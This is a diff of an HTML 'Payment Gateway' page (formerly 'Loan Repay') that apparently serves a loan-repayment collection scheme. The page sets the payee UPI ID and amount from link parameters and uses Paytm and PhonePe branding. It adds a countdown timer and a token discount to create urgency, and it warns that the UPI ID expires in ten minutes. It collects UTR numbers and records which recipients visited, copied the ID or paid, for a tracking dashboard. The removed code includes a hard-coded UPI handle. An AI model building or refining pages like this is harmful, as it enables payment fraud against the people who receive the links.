@@ -3,213 +3,376 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loan Repay</title>
+  <title>Payment Gateway</title>
   <style>
-    * { box-sizing: border-box; }
-    body { font-family: Arial, sans-serif; background: #f7f7f7; margin: 0; padding: 10px; }
-    .container { max-width: 480px; width: 100%; margin: 10px auto; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-    .header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-    .header img { height: 35px; max-width: 100%; object-fit: contain; }
-    .timer { color: red; font-weight: bold; font-size: 1.1em; }
-    h2 { text-align: center; color: #0070f3; font-size: clamp(24px, 6vw, 32px); margin: 10px 0; }
-    .section-title { margin: 15px 0 10px; font-weight: bold; color: #444; font-size: 0.95em; }
-    .method { border: 1px solid #ddd; padding: 10px 12px; border-radius: 8px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; gap: 10px; text-decoration: none; color: inherit; background: #fff; width: 100%; }
-    .method img.icon { height: 28px; width: 28px; object-fit: contain; flex-shrink: 0; }
-    .method-info { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1; text-align: left; }
-    .method-info > div { overflow: hidden; text-overflow: ellipsis; }
-    .method-info small { display: block; color: #666; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .discount { background: #fff3e0; color: #e65100; font-size: 0.75em; padding: 2px 6px; border-radius: 4px; white-space: nowrap; }
-    .pay-btn { background: #0070f3; color: #fff; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: bold; flex-shrink: 0; font-size: 0.9em; }
-    .reminder { margin-top: 20px; font-size: 0.85em; color: #333; }
-    .reminder ol { padding-left: 20px; margin: 5px 0; }
-    .reminder li { margin-bottom: 6px; }
-    .highlight { color: red; font-weight: bold; }
-    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; padding: 15px; z-index: 1000; }
-    .modal-content { background: #fff; padding: 20px; border-radius: 10px; max-width: 400px; width: 100%; text-align: center; position: relative; max-height: 90vh; overflow-y: auto; }
-    .modal-content img { max-width: 100%; height: auto; width: 200px; }
-    .close { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; }
-    .utr-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 1em; }
-    .submit-btn { background: #0070f3; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; cursor: pointer; font-size: 1em; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f5f7;
+      color: #333;
+    }
+
+    /* Top Dark Header Bar */
+    .top-bar {
+      background-color: #000;
+      color: #fff;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+
+    .top-bar-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 14px;
+    }
+
+    .top-bar .amount {
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    .top-bar .discount-tag {
+      color: #ff9800;
+      font-weight: 600;
+    }
+
+    /* Top-Right Notification Toast (Screen Shot Matching) */
+    .toast-notification {
+      display: none;
+      background-color: #e54d42;
+      color: #ffffff;
+      padding: 8px 16px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 500;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      animation: fadeIn 0.3s forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Main Content Wrapper */
+    .container {
+      max-width: 960px;
+      margin: 20px auto;
+      padding: 0 15px;
+    }
+
+    /* White Card Sections */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 15px;
+    }
+
+    .timer {
+      color: #ff9800;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    /* Payment Method Item */
+    .method-item {
+      background-color: #f7f8fa;
+      border: 1px solid #edf0f5;
+      border-radius: 6px;
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .method-item:hover {
+      background-color: #f0f2f5;
+    }
+
+    .method-logo {
+      height: 24px;
+      display: flex;
+      align-items: center;
+    }
+
+    .hand-icon {
+      color: #0070f3;
+      font-size: 18px;
+    }
+
+    /* Step Instructions */
+    .step-text {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 10px;
+    }
+
+    .step-text span.highlight {
+      color: #ff9800;
+      font-weight: bold;
+    }
+
+    /* Input & Copy Box Group */
+    .input-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .upi-box {
+      flex: 1;
+      background-color: #f2f3f5;
+      border: 1px solid #e5e7eb;
+      border-radius: 6px;
+      padding: 12px 16px;
+      text-align: center;
+      font-weight: 600;
+      color: #333;
+      letter-spacing: 0.5px;
+      font-size: 14px;
+    }
+
+    .copy-btn {
+      background-color: #0070f3;
+      color: #fff;
+      border: none;
+      padding: 0 24px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .tip-red {
+      color: #ff4d4f;
+      font-size: 12px;
+      margin-bottom: 20px;
+    }
+
+    /* UTR Input Box */
+    .utr-input {
+      width: 100%;
+      background-color: #f2f3f5;
+      border: 1px solid #e5e7eb;
+      border-radius: 6px;
+      padding: 14px 16px;
+      font-size: 14px;
+      outline: none;
+      margin-bottom: 16px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background-color: #0070f3;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .bottom-tip {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 10px;
+    }
+
+    .bottom-tip a {
+      color: #ff9800;
+      text-decoration: none;
+    }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="header">
-    <img src="upi.png" alt="UPI Logo" onerror="this.style.display='none'">
-    <div>Order will be closed in: <span class="timer" id="countdown">08:00</span></div>
-  </div>
-
-  <h2 id="displayAmount">₹3600</h2>
-  <p style="text-align:center; color:#555; margin: 5px 0 15px; font-size: 0.9em;">The amount you need to pay</p>
-
-  <div class="section-title">Method 1 (Mostly used) <span class="discount">Discounted</span></div>
-  
-  <a id="paytmLink" href="#" class="method">
-    <div class="method-info">
-      <img src="paytm.png" alt="Paytm" class="icon" onerror="this.style.display='none'">
-      <div><strong>Paytm</strong><small id="paytmDiscountText">Discounted price</small></div>
+  <!-- Top Dark Bar -->
+  <div class="top-bar">
+    <div class="top-bar-left">
+      <div>Amount Payable: <span class="amount" id="topAmount">₹0.00</span></div>
+      <div class="discount-tag">Get ₹0.01 off</div>
     </div>
-    <img src="click here.png" alt="Click" style="height:20px; width:auto;" onerror="this.style.display='none'">
-  </a>
+    <!-- Toast Popup Message Box -->
+    <div class="toast-notification" id="toastBox">UPI copied successfully</div>
+  </div>
 
-  <a id="phonepeLink" href="#" class="method">
-    <div class="method-info">
-      <img src="phonepe.png" alt="PhonePe" class="icon" onerror="this.style.display='none'">
-      <div><strong>PhonePe</strong><small>Convenient and fastest</small></div>
+  <div class="container">
+    <!-- Section 1: Payment Methods -->
+    <div class="card">
+      <div class="section-header">
+        <span>Select a method to pay:</span>
+        <span class="timer" id="countdown">08:00</span>
+      </div>
+
+      <div class="method-item" onclick="payViaApp('paytm')">
+        <div class="method-logo">
+          <strong style="color: #002e6e; font-size: 20px;">pay<span style="color:#00baf2;">tm</span></strong>
+        </div>
+        <span class="hand-icon">👆</span>
+      </div>
+
+      <div class="method-item" onclick="payViaApp('phonepe')">
+        <div class="method-logo">
+          <strong style="color: #5f259f; font-size: 18px;">PhonePe</strong>
+        </div>
+        <span class="hand-icon">👆</span>
+      </div>
     </div>
-    <img src="click here.png" alt="Click" style="height:20px; width:auto;" onerror="this.style.display='none'">
-  </a>
 
-  <div class="section-title">Method 2</div>
-  <div class="method" onclick="openModal('qrModal')" style="cursor: pointer;">
-    <div class="method-info">
-      <img src="QR.png" alt="QR" class="icon" onerror="this.style.display='none'">
-      <strong>QR Code</strong>
+    <!-- Section 2: Manual Transfer & UTR Entry -->
+    <div class="card">
+      <div class="step-text">
+        1.Copy the UPI below and <span class="highlight">transfer <span id="transferAmount">₹0.00</span></span>
+      </div>
+
+      <div class="input-group">
+        <input type="text" id="upiValue" class="upi-box" value="" readonly>
+        <button class="copy-btn" onclick="copyUPI()">Copy</button>
+      </div>
+
+      <div class="tip-red">Tip: Don't save the upi, this upi is valid for 10 minutes</div>
+
+      <div class="step-text">2.Fill in UTR after payment</div>
+
+      <input type="text" id="utrInput" class="utr-input" placeholder="Please enter the 12-character UTR" maxlength="12" inputmode="numeric">
+
+      <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
     </div>
-    <button class="pay-btn" type="button">PAY</button>
-  </div>
 
-  <div class="section-title">Method 3</div>
-  <div class="method" onclick="openModal('upiModal')" style="cursor: pointer;">
-    <div class="method-info">
-      <img src="upi.png" alt="UPI" class="icon" onerror="this.style.display='none'">
-      <strong>Manual Transfer</strong>
+    <!-- Bottom Help Text -->
+    <div class="bottom-tip">
+      Tip: How to get UTR? Please <a href="#">click here</a>
     </div>
-    <button class="pay-btn" type="button">PAY</button>
   </div>
 
-  <div class="reminder">
-    <h3 style="margin: 10px 0 5px; font-size: 1em;">Important Reminder</h3>
-    <ol>
-      <li>Please make sure you have submit UTR here for closing.</li>
-      <li class="highlight">Don't pay for the same link repeatedly.</li>
-      <li>Please select the payment method you need and make sure your phone has the corresponding wallet software installed.</li>
-    </ol>
-  </div>
-</div>
+  <script>
+    // 1. Read URL Params generated from d3repayon.html
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkId = urlParams.get('id');
+    const paramAmount = urlParams.get('amount') || '3552.99';
+    const paramUpi = urlParams.get('upi') || 'i.b*********axis';
+    const paramName = urlParams.get('name') || 'Customer Name';
+    const paramMobile = urlParams.get('mobile') || 'Mobile Number';
 
-<div class="modal" id="qrModal">
-  <div class="modal-content">
-    <span class="close" onclick="closeModal('qrModal')">&times;</span>
-    <h2 id="modalQrAmount" style="font-size: 24px;">₹3600</h2>
-    <p style="font-size: 0.9em;">Use Mobile Scan code to pay</p>
-    <img src="QR.png" alt="QR Code" onerror="this.style.display='none'">
-    <input type="text" class="utr-input" id="utrQr" placeholder="Enter 12-digit UTR" maxlength="12" inputmode="numeric">
-    <button class="submit-btn" onclick="submitUTR('qr')">Submit UTR</button>
-  </div>
-</div>
+    const amt = parseFloat(paramAmount).toFixed(2);
 
-<div class="modal" id="upiModal">
-  <div class="modal-content">
-    <span class="close" onclick="closeModal('upiModal')">&times;</span>
-    <h2 id="modalUpiAmount" style="font-size: 24px;">₹3600</h2>
-    <p style="font-size: 0.9em;">Copy the UPI ID and pay</p>
-    <input type="text" value="" id="upiId" class="utr-input" readonly>
-    <button onclick="copyUPI()" class="submit-btn" style="margin-bottom: 10px;">Copy UPI ID</button>
-    <input type="text" class="utr-input" id="utrUpi" placeholder="Enter 12-digit UTR number" maxlength="12" inputmode="numeric">
-    <button class="submit-btn" onclick="submitUTR('upi')">Submit UTR</button>
-  </div>
-</div>
+    // Set UI values
+    document.getElementById('topAmount').textContent = '₹' + amt;
+    document.getElementById('transferAmount').textContent = '₹' + amt;
+    document.getElementById('upiValue').value = paramUpi;
 
-<script>
-  const urlParams = new URLSearchParams(window.location.search);
-  const linkId = urlParams.get('id');
-  const paramAmount = urlParams.get('amount') || '3600';
-  const paramUpi = urlParams.get('upi') || 'arka018@axl';
-  const paramName = urlParams.get('name') || 'Customer Name';
-  const paramMobile = urlParams.get('mobile') || 'Mobile Number';
-
-  const amt = parseFloat(paramAmount);
-  const discountedAmt = (amt > 2 ? amt - 1.7 : amt).toFixed(2);
-
-  document.getElementById('displayAmount').textContent = '₹' + amt;
-  document.getElementById('modalQrAmount').textContent = '₹' + discountedAmt;
-  document.getElementById('modalUpiAmount').textContent = '₹' + amt;
-  document.getElementById('paytmDiscountText').textContent = 'Discounted price ₹' + discountedAmt;
-  document.getElementById('upiId').value = paramUpi;
-
-  if (linkId) {
-    let history = JSON.parse(localStorage.getItem('paymentLinkHistory') || '[]');
-    let currentItem = history.find(item => item.id === linkId);
-    if (currentItem) {
-      currentItem.visited = true;
-      localStorage.setItem('paymentLinkHistory', JSON.stringify(history));
-    }
-  }
-
-  const paytmUrl = `paytmmp://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${discountedAmt}&cu=INR`;
-  const phonepeUrl = `phonepe://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${amt}&cu=INR`;
-  const fallbackUrl = `upi://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${amt}&cu=INR`;
-
-  document.getElementById('paytmLink').setAttribute('href', paytmUrl);
-  document.getElementById('phonepeLink').setAttribute('href', phonepeUrl);
-
-  document.getElementById('paytmLink').onclick = (e) => openApp(e, paytmUrl, fallbackUrl);
-  document.getElementById('phonepeLink').onclick = (e) => openApp(e, phonepeUrl, fallbackUrl);
-
-  let timeLeft = 8 * 60;
-  const countdown = document.getElementById("countdown");
-  function updateTimer() {
-    let minutes = Math.floor(timeLeft / 60);
-    let seconds = timeLeft % 60;
-    countdown.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-    if (timeLeft > 0) { timeLeft--; } else { countdown.textContent = "Expired"; }
-  }
-  setInterval(updateTimer, 1000);
-
-  function openModal(id) { document.getElementById(id).style.display = "flex"; }
-  function closeModal(id) { document.getElementById(id).style.display = "none"; }
-
-  function openApp(event, appScheme, fallbackScheme) {
-    event.preventDefault();
-    window.location.href = appScheme;
-    setTimeout(() => { window.location.href = fallbackScheme; }, 1500);
-  }
-
-  function copyUPI() {
-    var upi = document.getElementById("upiId");
-    upi.select(); upi.setSelectionRange(0, 99999);
-    
+    // Update Visited Status in LocalStorage for d3repayon.html tracking
     if (linkId) {
       let history = JSON.parse(localStorage.getItem('paymentLinkHistory') || '[]');
       let currentItem = history.find(item => item.id === linkId);
       if (currentItem) {
-        currentItem.copied = true;
+        currentItem.visited = true;
         localStorage.setItem('paymentLinkHistory', JSON.stringify(history));
       }
     }
 
-    navigator.clipboard.writeText(upi.value).then(() => {
-      alert("UPI ID copied: " + upi.value);
-    }).catch(() => {
-      document.execCommand("copy");
-      alert("UPI ID copied: " + upi.value);
-    });
-  }
+    // Timer Logic
+    let timeLeft = 8 * 60;
+    const countdown = document.getElementById("countdown");
+    function updateTimer() {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      countdown.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+      if (timeLeft > 0) { timeLeft--; } else { countdown.textContent = "00:00"; }
+    }
+    setInterval(updateTimer, 1000);
 
-  function submitUTR(type) {
-    let utr = type === 'qr' ? document.getElementById("utrQr").value.trim() : document.getElementById("utrUpi").value.trim();
-    
-    // exact 12 digit numeric validation
-    const utrRegex = /^\d{12}$/;
+    // 2. Custom Toast Notification (Shown in your screenshot)
+    function showToast(message) {
+      const toast = document.getElementById('toastBox');
+      toast.textContent = message;
+      toast.style.display = 'block';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 2500);
+    }
 
-    if (utrRegex.test(utr)) {
+    // 3. Copy UPI Functionality
+    function copyUPI() {
+      const upiInput = document.getElementById("upiValue");
+      upiInput.select();
+      
+      // Update Copy status for d3repayon.html dashboard
       if (linkId) {
         let history = JSON.parse(localStorage.getItem('paymentLinkHistory') || '[]');
         let currentItem = history.find(item => item.id === linkId);
         if (currentItem) {
-          currentItem.status = 'UTR: ' + utr;
+          currentItem.copied = true;
           localStorage.setItem('paymentLinkHistory', JSON.stringify(history));
         }
       }
-      // Redirecting to repaynow.html page with parameters
-      window.location.href = `repaynow.html?name=${encodeURIComponent(paramName)}&mobile=${encodeURIComponent(paramMobile)}&amount=${encodeURIComponent(amt)}`;
-    } else {
-      alert("Please enter a valid 12-digit numeric UTR number.");
-    }
-  }
-</script>
 
+      navigator.clipboard.writeText(upiInput.value).then(() => {
+        showToast("UPI copied successfully");
+      }).catch(() => {
+        document.execCommand("copy");
+        showToast("UPI copied successfully");
+      });
+    }
+
+    // 4. Submit UTR Functionality with 12 Digit Check
+    function submitUTR() {
+      const utr = document.getElementById("utrInput").value.trim();
+      const utrRegex = /^\d{12}$/;
+
+      if (utrRegex.test(utr)) {
+        // Save UTR to status
+        if (linkId) {
+          let history = JSON.parse(localStorage.getItem('paymentLinkHistory') || '[]');
+          let currentItem = history.find(item => item.id === linkId);
+          if (currentItem) {
+            currentItem.status = 'UTR: ' + utr;
+            localStorage.setItem('paymentLinkHistory', JSON.stringify(history));
+          }
+        }
+        // Redirect to repaynow.html page
+        window.location.href = `repaynow.html?name=${encodeURIComponent(paramName)}&mobile=${encodeURIComponent(paramMobile)}&amount=${encodeURIComponent(amt)}`;
+      } else {
+        showToast("Please enter UTR");
+      }
+    }
+
+    // App Redirect Functionality
+    function payViaApp(app) {
+      const discountedAmt = (amt > 2 ? amt - 0.01 : amt).toFixed(2);
+      let appUrl = "";
+      if(app === 'paytm') {
+        appUrl = `paytmmp://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${discountedAmt}&cu=INR`;
+      } else {
+        appUrl = `phonepe://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${amt}&cu=INR`;
+      }
+      window.location.href = appUrl;
+    }
+  </script>
 </body>
 </html>
